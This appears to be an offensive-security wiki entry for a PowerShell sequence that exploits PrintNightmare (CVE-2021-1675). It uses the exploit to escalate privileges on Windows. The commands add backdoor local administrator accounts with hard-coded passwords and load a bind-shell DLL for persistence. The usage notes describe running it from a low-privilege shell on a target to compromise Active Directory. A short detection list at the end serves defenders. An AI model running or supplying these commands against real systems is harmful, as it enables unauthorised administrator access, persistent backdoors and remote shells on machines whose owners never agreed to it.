---
id: e9797ab4-817b-49da-83d7-a8b2be294ede
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:02.971387+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - lpe
  - printnightmare
  - persistence
validated: true
---

# Invoke-Nightmare-LPE-Sequence

## Code

```powershell
## LPE only (PS1 + DLL)
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

## Description

PowerShell sequence using the CVE-2021-1675 module to perform LPE via PrintNightmare: adds default and custom backdoor users to admins, then loads a DLL for shell/persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| -DriverName | Fake driver name for hijack | Dementor |
| -NewUser | Backdoor username | d3m3nt0r |
| -NewPassword | Password for user | AzkabanUnleashed123* |
| -DLL | Path to payload DLL | C:\absolute\path\to\your\bindshell.dll |

## Usage

Execute on target with low-priv shell; module must be downloaded first. Creates persistent access via users; DLL for immediate shell. Used in [[procedures/Exploit-PrintNightmare-for-SYSTEM-Shell-on-Domain-Controller]] for AD compromise.

## Detection

- PowerShell ScriptBlock logging for Invoke-Nightmare calls.
- Event ID 4720/4732 for new user additions to admins.
- AMSI scans for module import; EDR for DLL loads in spooler.
